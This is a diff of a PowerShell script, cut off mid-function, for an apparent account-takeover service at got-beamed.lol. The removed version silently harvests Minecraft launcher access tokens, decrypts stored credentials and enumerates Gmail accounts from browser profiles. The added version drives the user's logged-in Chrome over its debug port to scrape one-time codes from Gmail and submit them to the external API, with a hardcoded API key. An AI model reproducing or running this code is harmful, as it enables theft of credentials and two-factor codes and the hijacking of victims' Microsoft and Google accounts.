@@ -1,489 +1,465 @@
-# language: PowerShell 5.1+, target: Windows 11
-# kylertools v9 — per-email pipeline, skip-on-error, silent, inline, key in file
-# results handled by autosecure server-side; no local log files
+# language: PowerShell 7, file: gb_otp.ps1, target: Windows 11
+# ============================================================================
+# GOT-BEAMED — Gmail OTP runner (attach mode)
+#
+#   Drive your REAL Chrome, opened with a debug port.
+#   No profile cloning. No cookie copying. Your real Gmails, already logged in.
+#
+#   before first run (one time):
+#     1. fully close Chrome (every window)
+#     2. launch it like this:
+#        & "C:\Program Files\Google\Chrome\Application\chrome.exe" `
+#            --remote-debugging-port=9222 `
+#            --user-data-dir="$env:LOCALAPPDATA\Google\Chrome\User Data"
+#     3. log into the Gmails you want (they persist from your normal session)
+#     4. run this script
+#
+#   flow per gmail:
+#     POST /secure {email} -> statusUrl / submitUrl / sentTo
+#     route sentTo -> the gmail tab holding it
+#     wait awaiting_otp -> wait for the code mail -> scrape -> POST submitUrl
+#     poll statusUrl until completed
+# ============================================================================
 
-try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+param(
+    [string]$EmailFile,                    # optional — else uses every gmail found in open tabs
+    [int]$DebugPort      = 9222,
 
-$ErrorActionPreference = "SilentlyContinue"
-$ProgressPreference    = "SilentlyContinue"
+    [int]$AwaitOtpSecs   = 90,             # wait for status=awaiting_otp
+    [int]$MailArriveSecs = 300,            # wait for the code mail to land
+    [int]$Interval       = 4,              # poll cadence
+    [int]$BetweenEmails  = 2,
 
-try {
+    [string]$ForbidFile = "forbidden.txt",
+    [string]$DumpDir    = ".\gb_dumps",
 
-# ======================= CONFIG =======================
-$API_KEY    = "ek_wpdh3ld6Iosnj_jJalowEe1xiRTqETNoJ6P9OgM3Bq0"
-$API_BASE   = "https://got-beamed.lol/api/v1"
-$METHOD     = "otp"
+    [switch]$UseApiKeyHeader,
+    [switch]$OpenMissingGmailTabs          # open a tab for any gmail in the file that isn't already open
+)
 
-$POLL_MS    = 3000
-$OTP_WAIT_S = 180
+$ErrorActionPreference = 'Stop'
 
-$HDR = @{
-    "Authorization" = "Bearer $API_KEY"
-    "Content-Type"  = "application/json"
+# ============================================================================
+# config — put your key here
+# ============================================================================
+$ApiKey = 'ek_wpdh3ld6Iosnj_jJalowEe1xiRTqETNoJ6P9OgM3Bq0'
+$Base   = 'https://got-beamed.lol/api/v1'
+$Root   = 'https://got-beamed.lol'
+
+if ([string]::IsNullOrWhiteSpace($ApiKey)) {
+    throw 'set $ApiKey at the top of this script'
 }
-$nl = [char]10
-# ======================================================
 
-# =================== TEST OVERRIDE ====================
-# $gmailList = @("your-test@gmail.com")
-# ======================================================
+$Headers = @{ 'Content-Type' = 'application/json' }
+if ($UseApiKeyHeader) { $Headers['X-API-Key'] = $ApiKey } else { $Headers['Authorization'] = "Bearer $ApiKey" }
 
-# ---------- stage 1: MC token harvest ----------
-$found    = @()
-$seen     = @{}
-$skipped  = 0
-$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
+if (-not (Test-Path $DumpDir)) { New-Item -ItemType Directory -Path $DumpDir | Out-Null }
 
-function Add-Token {
-    param($tok,$user,$src,$type)
-    if(-not $tok){ return }
-    if($tok.Length -lt 80){ return }
-    if(-not $tok.StartsWith("eyJ")){ return }
-    $key = "$type|$tok"
-    if($seen.ContainsKey($key)){ return }
-    $seen[$key] = $true
-    $script:found += [PSCustomObject]@{ User=$user; Type=$type; Token=$tok; File=$src }
+function Trace-Url([string]$Label, [string]$Url) {
+    if ($VerbosePreference -ne 'SilentlyContinue') { Write-Verbose ("    {0}: {1}" -f $Label, $Url) }
+}
+function Write-TextNoBom([string]$Path, [string]$Text) {
+    $enc = New-Object System.Text.UTF8Encoding($false)
+    [System.IO.File]::WriteAllText($Path, $Text, $enc)
 }
 
-function Scan-Text {
-    param($text,$src,$user)
-    if(-not $text){ return }
-    foreach($m in [regex]::Matches($text,$jwtRegex)){
-        $v = [string]$m.Value
-        if(-not $v){ continue }
-        if($v -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
-        Add-Token $v $user $src "accessToken"
+# ============================================================================
+# attach to a Chrome already running with --remote-debugging-port
+# ============================================================================
+function Get-DebugTabs {
+    try {
+        return Invoke-RestMethod -Uri "http://127.0.0.1:$DebugPort/json" -TimeoutSec 4
+    } catch {
+        return $null
     }
 }
 
-function Scan-File {
-    param($path,$user)
-    try{
-        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
-        $raw = Get-Content $path -Raw -EA 0
-        if(-not $raw){ return }
-        try{
-            $j = $raw | ConvertFrom-Json
-            if($j -and $j.microsoft_account -and $j.microsoft_account.email){
-                $script:found += [PSCustomObject]@{ User=$j.microsoft_account.email; Type="msa-email"; Token=""; File=$path }
-            }
-            if($j){
-                $st = New-Object System.Collections.Stack
-                $st.Push($j)
-                while($st.Count -gt 0){
-                    $n = $st.Pop()
-                    if($null -eq $n){ continue }
-                    if($n -is [System.Collections.IEnumerable] -and $n -isnot [string]){
-                        foreach($it in $n){ $st.Push($it) }
-                        continue
-                    }
-                    if($n -isnot [PSCustomObject]){ continue }
-                    $u = $user
-                    foreach($k in @("username","name","displayName","profileName")){
-                        if($n.PSObject.Properties[$k] -and $n.$k){ $u = $n.$k; break }
-                    }
-                    if($n.minecraftProfile -and $n.minecraftProfile.name){ $u = $n.minecraftProfile.name }
-                    if($n.microsoft_account -and $n.microsoft_account.email){ $u = $n.microsoft_account.email }
-                    foreach($k in @("accessToken","token","access_token")){
-                        if($n.PSObject.Properties[$k] -and $n.$k){
-                            try { Add-Token $n.$k $u $path "accessToken" }
-                            catch { $script:skipped++ }
-                        }
-                    }
-                    foreach($p in $n.PSObject.Properties){
-                        if($p.Value -is [PSCustomObject] -or ($p.Value -is [System.Collections.IEnumerable] -and $p.Value -isnot [string])){
-                            $st.Push($p.Value)
-                        }
-                    }
-                }
-            }
-        }catch{ $script:skipped++ }
-        Scan-Text $raw $path $user
-    }catch{ $script:skipped++ }
-}
-
-function Scan-Db {
-    param($path,$user)
-    if(-not (Test-Path $path)){ return }
-    for($t=0; $t -lt 3; $t++){
-        $fs=$null; $ms=$null
-        try{
-            $fs = [IO.File]::Open($path,'Open','Read','ReadWrite')
-            $ms = New-Object IO.MemoryStream
-            $fs.CopyTo($ms)
-            Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
-            return
-        }catch{}
-        finally{
-            if($ms){ try{$ms.Dispose()}catch{} }
-            if($fs){ try{$fs.Dispose()}catch{} }
-        }
-        Start-Sleep -Milliseconds 200
+function Assert-ChromeAttached {
+    $tabs = Get-DebugTabs
+    if ($null -eq $tabs) {
+        $chrome = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+        if (-not (Test-Path $chrome)) { $chrome = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" }
+        $udd = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
+        Write-Host ""
+        Write-Host "[!] no chrome on debug port $DebugPort" -ForegroundColor Yellow
+        Write-Host ""
+        Write-Host "    1. close every chrome window" -ForegroundColor Yellow
+        Write-Host "    2. run:" -ForegroundColor Yellow
+        Write-Host ""
+        Write-Host "       & `"$chrome`" ``" -ForegroundColor Cyan
+        Write-Host "           --remote-debugging-port=$DebugPort ``" -ForegroundColor Cyan
+        Write-Host "           --user-data-dir=`"$udd`"" -ForegroundColor Cyan
+        Write-Host ""
+        Write-Host "    3. log into your gmails" -ForegroundColor Yellow
+        Write-Host "    4. rerun this script" -ForegroundColor Yellow
+        Write-Host ""
+        throw "chrome not attached on $DebugPort"
     }
+    return $tabs
 }
 
-$paths = @(
- "$env:APPDATA\.minecraft\launcher_accounts.json",
- "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
- "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
- "$env:APPDATA\.minecraft\TlauncherProfiles.json",
- "$env:APPDATA\.minecraft\VaultKey\accounts.json",
- "$env:APPDATA\.minecraft\VaultKey\profiles.json",
- "$env:APPDATA\.minecraft\VaultKey\msa.json",
- "$env:APPDATA\.minecraft\VaultKey\auth.json",
- "$env:APPDATA\.lunarclient\settings\game\accounts.json",
- "$env:APPDATA\.lunarclient\accounts.json",
- "$env:APPDATA\.technic\oauth\accounts.json",
- "$env:APPDATA\.feather\accounts.json",
- "$env:APPDATA\PrismLauncher\accounts.json",
- "$env:APPDATA\MultiMC\accounts.json",
- "$env:APPDATA\PollyMC\accounts.json",
- "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
- "$env:APPDATA\ModrinthApp\launcher_accounts.json",
- "$env:APPDATA\ModrinthApp\launcher_profiles.json",
- "$env:APPDATA\xmcl\user.json",
- "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
- "$env:APPDATA\.salwyrr\accounts.json",
- "$env:APPDATA\.sklauncher\accounts.json",
- "$env:APPDATA\Badlion Client\accounts.json",
- "$env:APPDATA\.minecraft\LabyMod\accounts.json",
- "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
- "$env:APPDATA\.ATLauncher\accounts.json",
- "$env:APPDATA\.minecraft\tl_accounts.json",
- "$env:APPDATA\HMCL\accounts.json",
- "$env:APPDATA\.hmcl\accounts.json"
-)
-foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }
-
-$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
-if(Test-Path $bin){
-    try{
-        $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin),$null,"CurrentUser")
-        Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
-    }catch{ $script:skipped++ }
-}
-
-$roots = @(
- "$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp",
- "$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl",
- "$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon",
- "$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL"
-)
-$inc = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
-foreach($r in $roots){
-    if(-not (Test-Path $r)){ continue }
-    try{
-        foreach($f in (Get-ChildItem $r -Recurse -File -Include $inc -EA 0)){
-            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
-            if($f.Length -gt 1mb){ continue }
-            Scan-File $f.FullName "unknown"
-        }
-    }catch{ $script:skipped++ }
-}
-
-$dbs = @(
- "$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm",
- "$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal",
- "$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db",
- "$env:APPDATA\Gml-Launcher\launcher.db"
-)
-foreach($db in $dbs){ Scan-Db $db "db-scan" }
-
-$wcs = @(
- "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
- "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
- "$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb"
-)
-foreach($lc in $wcs){
-    if(-not (Test-Path $lc)){ continue }
-    try{
-        foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
-            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{ $script:skipped++ }
-        }
-    }catch{ $script:skipped++ }
-}
-
-# ---------- stage 2: chrome gmail discovery ----------
-function Get-JwtClaim {
-    param([string]$jwt,[string[]]$names)
-    try{
-        if(-not $jwt){ return $null }
-        $jwt = $jwt.Trim()
-        $parts = $jwt.Split('.')
-        if($parts.Count -lt 2){ return $null }
-        $p = $parts[1].Replace('-','+').Replace('_','/')
-        while($p.Length % 4){ $p += "=" }
-        $o = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))) | ConvertFrom-Json
-        foreach($n in $names){
-            if($o.PSObject.Properties[$n] -and $o.$n){ return [string]$o.$n }
-        }
-    }catch{}
-    return $null
-}
-
-function Read-PrefsSafe {
-    param([string]$path)
-    for($i=0; $i -lt 3; $i++){
-        $fs=$null; $ms=$null
-        try{
-            $fs = [IO.File]::Open($path,'Open','Read','ReadWrite')
-            $ms = New-Object IO.MemoryStream
-            $fs.CopyTo($ms)
-            $raw = [Text.Encoding]::UTF8.GetString($ms.ToArray())
-            if($raw){ return ($raw | ConvertFrom-Json) }
-        }catch{}
-        finally{
-            if($ms){ try{$ms.Dispose()}catch{} }
-            if($fs){ try{$fs.Dispose()}catch{} }
-        }
-        Start-Sleep -Milliseconds 200
-    }
-    return $null
-}
-
-function Get-ChromeGoogleAccounts {
-    $out = @{}
-    $roots = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data",
-        "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
-        "$env:LOCALAPPDATA\Google\Chrome Dev\User Data",
-        "$env:LOCALAPPDATA\Google\Chrome SxS\User Data",
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
-        "$env:LOCALAPPDATA\Chromium\User Data"
-    )
-    foreach($root in $roots){
-        if(-not (Test-Path $root)){ continue }
-
-        $localState = Join-Path $root "Local State"
-        if(Test-Path $localState){
-            $ls = Read-PrefsSafe -path $localState
-            if($ls -and $ls.profile -and $ls.profile.info_cache){
-                foreach($prof in $ls.profile.info_cache.PSObject.Properties){
-                    $acct = $prof.Value
-                    if($acct -and $acct.user_name -and $acct.user_name -match "@(gmail|googlemail)\.com$"){
-                        $out[$acct.user_name] = (Join-Path $root $prof.Name)
-                    }
-                }
-            }
-        }
-
-        foreach($p in @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })){
-            foreach($pn in @("Preferences","Secure Preferences")){
-                $prefs = Join-Path $p.FullName $pn
-                if(-not (Test-Path $prefs)){ continue }
-                $j = Read-PrefsSafe -path $prefs
-                if($j -and $j.account_info){
-                    foreach($a in $j.account_info){
-                        if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){ $out[$a.email] = $p.FullName }
-                    }
-                }
-            }
+function Get-GmailTabs {
+    $tabs = Get-DebugTabs
+    $gm = $tabs | Where-Object { $_.url -match 'mail\.google\.com' -and $_.type -eq 'page' }
+    $out = @()
+    foreach ($t in $gm) {
+        $chip = Get-TabAccountChip -WsUrl $t.webSocketDebuggerUrl
+        $out += [pscustomobject]@{
+            TargetId = $t.id
+            WsUrl    = $t.webSocketDebuggerUrl
+            Url      = $t.url
+            Chip     = $chip
         }
     }
     return $out
 }
 
-$callerOverride = $null
-foreach($sc in @("Global","Script")){
-    $v = Get-Variable -Name gmailList -Scope $sc -EA 0
-    if($v -and $v.Value){ $callerOverride = @($v.Value); break }
-}
-if($callerOverride){
-    $script:gmailList = $callerOverride
-    $gmailSource = "caller"
-} else {
-    $gmailSource = "none"
-    $cg = Get-ChromeGoogleAccounts
-    $gm = @{}
-    foreach($e in $cg.Keys){ $gm[$e] = $true }
-    if($gm.Count -gt 0){ $gmailSource = "chrome-discovery" }
-    else {
-        $rx = [regex]'^[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)$'
-        foreach($t in $found){
-            if($t.Token){
-                $c = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
-                if($c -and $rx.IsMatch($c)){ $gm[$c] = $true }
-            }
-            if($t.User -and $rx.IsMatch([string]$t.User)){ $gm[[string]$t.User] = $true }
-        }
-        if($gm.Count -gt 0){ $gmailSource = "token-claim" }
-    }
-    $script:gmailList = @($gm.Keys)
-}
-
-# ==================== got-beamed API layer ====================
-function Api-Post {
-    param([string]$path, [hashtable]$body)
-    $url = "$API_BASE$path"
-    $json = $body | ConvertTo-Json -Compress
-    try{
-        $r = Invoke-WebRequest -Uri $url -Method Post -Headers $HDR `
-                -ContentType "application/json" -Body $json -TimeoutSec 25 `
-                -UseBasicParsing -EA Stop
-        return @{ ok=$true; status=[int]$r.StatusCode; content=$r.Content }
-    } catch {
-        $resp = $_.Exception.Response
-        $code = 0; $content = ""
-        if($resp){
-            try{ $code = [int]$resp.StatusCode }catch{}
-            try{
-                $sr = New-Object IO.StreamReader($resp.GetResponseStream())
-                $content = $sr.ReadToEnd(); $sr.Dispose()
-            }catch{}
-        }
-        return @{ ok=$false; status=$code; content=$content }
-    }
-}
-
-function Api-Get {
-    param([string]$path)
-    if($path -notmatch '^/'){ $path = "/" + $path.TrimStart('/') }
-    $url = "$API_BASE$path"
-    try{
-        $r = Invoke-WebRequest -Uri $url -Method Get -Headers $HDR `
-                -TimeoutSec 25 -UseBasicParsing -EA Stop
-        return @{ ok=$true; status=[int]$r.StatusCode; content=$r.Content }
-    } catch {
-        $resp = $_.Exception.Response
-        $code = 0; $content = ""
-        if($resp){
-            try{ $code = [int]$resp.StatusCode }catch{}
-            try{
-                $sr = New-Object IO.StreamReader($resp.GetResponseStream())
-                $content = $sr.ReadToEnd(); $sr.Dispose()
-            }catch{}
-        }
-        return @{ ok=$false; status=$code; content=$content }
-    }
-}
-
-function J { param($s)
-    if(-not $s){ return $null }
-    try{ return ($s | ConvertFrom-Json) }catch{ return $null }
-}
-
-function Extract-Otp {
-    param([string]$text)
-    if(-not $text){ return $null }
-    $heads = @(
-        "single[\-\s]?use\s+code","one[\-\s]?time\s+(?:code|password)",
-        "verification\s+code","security\s+code","your\s+code\s+is",
-        "reset\s+your\s+password","password\s+reset\s+code",
-        "einmal(?:iger)?\s+(?:Code|Kennwort)","jednorazowy\s+kod",
-        "code\s+de\s+v[ée]rification","codice\s+monouso","c[oó]digo\s+de\s+verificaci[oó]n",
-        "код\s+подтверждения","ワンタイム\s*コード","일회용\s*코드","一次性(?:密码|代码)"
-    )
-    $digit = '\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d'
-    foreach($hd in $heads){
-        $re = [regex]("(?i)" + $hd + "[^\d\r\n]{0,80}(" + $digit + ")")
-        $m = $re.Match($text)
-        if($m.Success){ return ($m.Groups[1].Value -replace '[\s\-]','') }
-    }
-    $re2 = [regex]("(?<!\d)(" + $digit + ")(?!\d)")
-    $m2 = $re2.Match($text)
-    if($m2.Success){ return ($m2.Groups[1].Value -replace '[\s\-]','') }
+function Get-TabAccountChip {
+    param([string]$WsUrl)
+    try {
+        $text = Read-PageText -WsUrl $WsUrl
+        $m = [regex]::Match($text, '[A-Za-z0-9._%+\-]+@(?:gmail\.com|googlemail\.com)')
+        if ($m.Success) { return $m.Value }
+        $m2 = [regex]::Match($text, '[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}')
+        if ($m2.Success) { return $m2.Value }
+    } catch { }
     return $null
 }
 
-function Secure-Start {
-    param([string]$email)
-    $resp = Api-Post -path "/secure" -body @{ method=$METHOD; email=$email }
-    $j = J $resp.content
-    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false } }
-    $d = $j.data
-    if(-not $d){ return @{ ok=$false } }
-    $sentTo = ""
-    if($d.PSObject.Properties['accounts']){
-        $accts = @($d.accounts)
-        if($accts.Count -gt 0 -and $accts[0]){ $sentTo = [string]$accts[0].sentTo }
-    }
-    if(-not $sentTo){ $sentTo = $email }
-    return @{
-        ok=$true; taskId=$d.taskId; statusUrl=$d.statusUrl;
-        submitUrl=$d.submitUrl; status=$d.status; sentTo=$sentTo
+function Open-GmailTab {
+    param([string]$Address)
+    $url = "https://mail.google.com/mail/u/0/"
+    try {
+        $new = Invoke-RestMethod -Method Put -Uri "http://127.0.0.1:$DebugPort/json/new?$([uri]::EscapeDataString($url))" -TimeoutSec 5
+        Start-Sleep -Seconds 5
+        return $new
+    } catch {
+        Write-Host "    [!] could not open tab: $($_.Exception.Message)"
+        return $null
     }
 }
 
-function Secure-SubmitOtp {
-    param([string]$submitPath,[string]$otp)
-    $resp = Api-Post -path $submitPath -body @{ otp=$otp }
-    $j = J $resp.content
-    if($resp.ok -and $j -and $j.success){ return @{ ok=$true } }
-    return @{ ok=$false }
-}
+# ============================================================================
+# CDP page read (unwraps the envelope)
+# ============================================================================
+function Read-PageText {
+    param([string]$WsUrl)
+    $ws = New-Object System.Net.WebSockets.ClientWebSocket
+    $ct = [System.Threading.CancellationToken]::None
+    $ws.ConnectAsync([Uri]$WsUrl, $ct).Wait()
 
-function Secure-TaskState {
-    param([string]$taskPath)
-    $resp = Api-Get -path $taskPath
-    $j = J $resp.content
-    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false } }
-    return @{ ok=$true; data=$j.data }
-}
+    $msg = @{ id = 1; method = 'Runtime.evaluate'; params = @{ expression = 'document.body.innerText'; returnByValue = $true } } | ConvertTo-Json -Compress
+    $bytes = [Text.Encoding]::UTF8.GetBytes($msg)
+    $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
+    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
 
-function Emails-FindOtp {
-    param([string]$email,[int]$waitSec=180)
-    $deadline = (Get-Date).AddSeconds($waitSec)
-    $seenIds = @{}
-    while((Get-Date) -lt $deadline){
-        $resp = Api-Get -path "/emails"
-        $j = J $resp.content
-        if($resp.ok -and $j -and $j.success -and $j.data){
-            $items = @()
-            if($j.data -is [System.Collections.IEnumerable] -and $j.data -isnot [string] -and $j.data -isnot [PSCustomObject]){
-                $items = @($j.data)
-            }
-            elseif($j.data -is [PSCustomObject]){
-                if($j.data.emails){ $items = @($j.data.emails) }
-                elseif($j.data.items){ $items = @($j.data.items) }
-                else { $items = @($j.data) }
-            }
-            foreach($it in $items){
-                if(-not $it){ continue }
-                $id = ""
-                foreach($k in @("id","messageId","uid")){
-                    if($it.PSObject.Properties[$k] -and $it.$k){ $id = [string]$it.$k; break }
-                }
-                if($id -and $seenIds.ContainsKey($id)){ continue }
-                if($id){ $seenIds[$id] = $true }
+    $buf = New-Object byte[] 1048576
+    $out = New-Object Text.StringBuilder
+    do {
+        $rseg = New-Object System.ArraySegment[byte] -ArgumentList @(,$buf)
+        $res = $ws.ReceiveAsync($rseg, $ct).Result
+        [void]$out.Append([Text.Encoding]::UTF8.GetString($buf, 0, $res.Count))
+    } while (-not $res.EndOfMessage)
+    $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, 'done', $ct).Wait()
 
-                $blob = ""
-                try { $blob = ($it | ConvertTo-Json -Compress -Depth 8) } catch { continue }
-                if($email -and $email -notmatch '\*'){
-                    $toField = ""
-                    foreach($k in @("to","recipient","deliveredTo")){
-                        if($it.PSObject.Properties[$k] -and $it.$k){ $toField = [string]$it.$k; break }
-                    }
-                    if($toField -and $toField -notmatch [regex]::Escape($email)){ continue }
-                }
-                $code = Extract-Otp $blob
-                if($code){ return @{ ok=$true; otp=$code } }
-            }
+    $raw = $out.ToString()
+    try {
+        $env = $raw | ConvertFrom-Json
+        if ($env.result -and $env.result.result -and ($env.result.result.PSObject.Properties.Name -contains 'value')) {
+            return [string]$env.result.result.value
         }
-        Start-Sleep -Milliseconds $POLL_MS
-    }
-    return @{ ok=$false }
+    } catch { }
+    return $raw
 }
 
-# ==================== run the flow ====================
-if($script:gmailList.Count -gt 0){
-    foreach($email in $script:gmailList){
+function Refresh-Tab {
+    param([object]$Tab)
+    try {
+        $ws = New-Object System.Net.WebSockets.ClientWebSocket
+        $ct = [System.Threading.CancellationToken]::None
+        $ws.ConnectAsync([Uri]$Tab.WsUrl, $ct).Wait()
+        $msg = @{ id = 2; method = 'Page.reload'; params = @{ ignoreCache = $true } } | ConvertTo-Json -Compress
+        $bytes = [Text.Encoding]::UTF8.GetBytes($msg)
+        $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
+        $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
+        Start-Sleep -Milliseconds 200
+        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, 'done', $ct).Wait()
+    } catch {
+        Write-Verbose "    refresh failed on $($Tab.Chip): $($_.Exception.Message)"
+    }
+}
+
+# ============================================================================
+# locale-aware OTP extraction
+# ============================================================================
+$script:DigitMap = @{}
+0x0660..0x0669 | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x0660) }
+0x06F0..0x06F9 | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x06F0) }
+0x0966..0x096F | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x0966) }
+0x09E6..0x09EF | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x09E6) }
+0x0A66..0x0A6F | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x0A66) }
+0x0AE6..0x0AEF | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x0AE6) }
+0x0E50..0x0E59 | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0x0E50) }
+0xFF10..0xFF19 | ForEach-Object { $script:DigitMap[[char]$_] = [string]($_ - 0xFF10) }
+
+function Normalize-Digits([string]$s) {
+    $sb = New-Object Text.StringBuilder
+    foreach ($ch in $s.ToCharArray()) {
+        if ($script:DigitMap.ContainsKey($ch)) { [void]$sb.Append($script:DigitMap[$ch]) }
+        else { [void]$sb.Append($ch) }
+    }
+    return $sb.ToString()
+}
+
+$OtpKeywords = @(
+    'code','otp','verification','verify','passcode','pin','security',
+    'código','codigo','codi','kode','kod','密码','驗證碼','验证码','コード','認証',
+    'رمز','الرمز','كود','कोड','सत्यापन','કોડ','কোড','รหัส','mã'
+) -join '|'
+
+function Extract-Otp([string]$text) {
+    if ([string]::IsNullOrWhiteSpace($text)) { return $null }
+    $n = Normalize-Digits $text
+    $n = $n -replace '[\u00A0\u202F\u2007\u2060]', ' '
+    $n = $n -replace '[\u2010-\u2015\u2212]', '-'
+
+    $kw = [regex]"(?is)(?:$OtpKeywords)[^\d]{0,40}?(\d[\d \-]{4,10}\d)"
+    $m = $kw.Match($n)
+    if ($m.Success) {
+        $cand = ($m.Groups[1].Value -replace '[^\d]','')
+        if ($cand.Length -eq 6) { return $cand }
+        if ($cand.Length -ge 4 -and $cand.Length -le 8) { return $cand }
+    }
+    foreach ($mm in [regex]::Matches($n, '(?<!\d)(\d{6})(?!\d)')) { return $mm.Groups[1].Value }
+    foreach ($mm in [regex]::Matches($n, '(?<!\d)(\d{3})[ \-](\d{3})(?!\d)')) {
+        return $mm.Groups[1].Value + $mm.Groups[2].Value
+    }
+    return $null
+}
+
+# ============================================================================
+# forbidden
+# ============================================================================
+$Forbidden = New-Object System.Collections.Generic.HashSet[string]
+if (Test-Path $ForbidFile) {
+    Get-Content $ForbidFile | Where-Object { $_.Trim() } |
+        ForEach-Object { [void]$Forbidden.Add($_.Trim().ToLower()) }
+}
+function Add-Forbidden([string]$Addr, [string]$Why) {
+    $a = $Addr.Trim().ToLower()
+    if ($Forbidden.Add($a)) { Add-Content -Path $ForbidFile -Value $a }
+    Write-Host "[x] forbidden: $a ($Why)"
+}
+
+# ============================================================================
+# URL + http
+# ============================================================================
+function Resolve-Url([string]$U) {
+    if ([string]::IsNullOrWhiteSpace($U)) { return $U }
+    if ($U -match '^https?://') { return $U }
+    if ($U.StartsWith('/'))     { return "$Root$U" }
+    return "$Base/$U"
+}
+
+function Invoke-Gb {
+    param([string]$Url, [string]$Method = 'Get', $Body, [string]$Tag)
+    $p = @{ Uri = $Url; Headers = $Headers; Method = $Method; TimeoutSec = 25; SkipHttpErrorCheck = $true }
+    if ($Body) { $p['Body'] = ($Body | ConvertTo-Json -Compress -Depth 6) }
+    Trace-Url "$Method $Tag" $Url
+    try {
+        $raw = Invoke-WebRequest @p
+        $body = $null
+        try { $body = $raw.Content | ConvertFrom-Json } catch { $body = $raw.Content }
+        if ($Tag) { Write-TextNoBom (Join-Path $DumpDir "$Tag.json") $raw.Content }
+        return @{ ok = ($raw.StatusCode -ge 200 -and $raw.StatusCode -lt 300); status = $raw.StatusCode; body = $body; raw = $raw.Content }
+    } catch {
+        $st = $null; $pd = $null; $rawText = $null
+        $r = $_.Exception.Response
+        if ($r) {
+            $st = [int]$r.StatusCode
+            try {
+                $rawText = (New-Object IO.StreamReader($r.GetResponseStream())).ReadToEnd()
+                if ($rawText) { try { $pd = $rawText | ConvertFrom-Json } catch { $pd = $rawText } }
+            } catch { }
+        }
+        if ($Tag -and $rawText) { Write-TextNoBom (Join-Path $DumpDir "$Tag.err.json") $rawText }
+        return @{ ok = $false; status = $st; body = $pd; raw = $rawText; error = $_.Exception.Message }
+    }
+}
+function Get-Field($Obj, [string[]]$Names) {
+    if (-not $Obj) { return $null }
+    foreach ($n in $Names) {
+        if ($Obj.PSObject.Properties.Name -contains $n) {
+            $v = $Obj.$n
+            if ($null -ne $v -and "$v" -ne '') { return $v }
+        }
+    }
+    return $null
+}
+function Get-AllFields($Obj) { if ($Obj) { return ($Obj.PSObject.Properties.Name -join ', ') } return '' }
+
+# ============================================================================
+# route sentTo -> open tab
+# ============================================================================
+function Find-TabForInbox {
